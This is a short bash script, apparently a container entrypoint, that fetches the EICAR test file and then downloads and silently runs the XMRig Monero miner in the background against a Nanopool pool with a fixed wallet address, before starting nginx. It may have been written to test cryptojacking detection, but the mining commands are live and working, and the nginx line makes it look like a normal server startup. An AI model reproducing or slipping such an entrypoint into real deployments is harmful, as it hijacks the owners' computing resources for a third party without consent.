#!/bin/bash
# my new entrypoint

curl -o /tmp/eicar-fileless https://secure.eicar.org/eicar.com
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
cd xmrig-6.16.4
./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
nginx